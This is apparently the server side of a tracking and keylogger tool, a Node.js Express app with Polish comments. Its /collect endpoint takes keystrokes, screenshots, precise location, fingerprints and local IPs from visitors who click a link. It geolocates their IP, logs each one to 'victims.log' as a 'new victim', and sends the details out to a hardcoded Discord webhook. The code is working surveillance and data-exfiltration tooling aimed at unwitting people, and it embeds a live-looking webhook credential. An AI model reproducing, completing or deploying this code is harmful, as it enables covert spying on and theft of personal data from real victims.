const express = require('express');
const fs = require('fs');
const app = express();

// === ZWIĘKSZONY LIMIT DLA SCREENSHOT (BASE64) ===
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// === KONFIGURACJA DISCORD ===
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1534935200776327211/Xq6qX3_LhsiAaxdTcZPQ5KrQwgYrTzmxSJYHi1VuEroL0eh2wah8MJWVgV1lyHwy3C_v';
// ============================

app.post('/collect', async (req, res) => {
    const rawIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const realIP = rawIP.split(',')[0].trim();

    const data = req.body;
    data.ip = realIP;
    data.timestamp = new Date().toISOString();

    // === GEOLOKALIZACJA Z IP ===
    let geo = {};
    try {
        const response = await fetch(`http://ip-api.com/json/${realIP}?fields=status,country,regionName,city,zip,lat,lon,isp,org,timezone`);
        const result = await response.json();
        if (result.status === 'success') {
            geo = {
                country: result.country,
                region: result.regionName,
                city: result.city,
                zip: result.zip,
                latitude: result.lat,
                longitude: result.lon,
                isp: result.isp,
                org: result.org,
                timezone: result.timezone
            };
        }
    } catch (e) { console.error('Błąd geolokalizacji IP:', e); }

    // === ŁĄCZONE DANE ===
    const fullData = {
        ...data,
        geo: geo,
        headers: {
            'user-agent': req.headers['user-agent'],
            'accept-language': req.headers['accept-language'],
            'referer': req.headers['referer'] || 'direct'
        }
    };

    // === ZAPISZ DO PLIKU (pełny JSON) ===
    fs.appendFileSync('victims.log', JSON.stringify(fullData) + '\n');
    console.log(`Nowa ofiara: ${realIP} | ${geo.city || 'Nieznane miasto'}`);

    // === WYSYŁKA NA DISCORD (bez screenshot – za duży) ===
    if (DISCORD_WEBHOOK.includes('discord.com')) {
        const embed = {
            embeds: [{
                title: '🔴 NOWA OFIARA! (DIC v2.0)',
                color: 0xff0000,
                fields: [
                    { name: '👤 IP', value: realIP, inline: true },
                    { name: '📍 Miasto', value: geo.city || 'Brak', inline: true },
                    { name: '🌍 Kraj', value: geo.country || 'Brak', inline: true },
                    { name: '📮 Kod', value: geo.zip || 'Brak', inline: true },
                    { name: '🏢 ISP', value: geo.isp || 'Brak', inline: true },
                    { name: '🖥️ System', value: data.userAgent || 'Brak', inline: true },
                    { name: '📱 Ekran', value: data.screen || 'Brak', inline: true },
                    { name: '🌐 Geolokacja (dokładna)', value: data.location ? `${data.location.lat}, ${data.location.lng}` : 'Brak zgody', inline: true },
                    { name: '🔑 Klawisze (keylogger)', value: data.keystrokes ? data.keystrokes.length + ' przechwyconych' : '0', inline: true },
                    { name: '🖼️ Screenshot', value: data.screenshot ? '✅ Wykonany (w logu)' : '❌ Brak', inline: true },
                    { name: '🔍 Fingerprint', value: data.canvasFingerprint ? '✅ Wygenerowany' : '❌ Brak', inline: true },
                    { name: '🌐 Lokalne IP', value: data.localIP || 'Brak', inline: true }
                ],
                footer: { text: `Kliknięto: ${data.timestamp}` }
            }]
        };
        try {
            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            });
        } catch (e) { console.error('Błąd wysyłki na Discord:', e); }
    }

    res.send('OK');
});

app.listen(8080, '0.0.0.0', () => console.log('Server running on port 8080'));
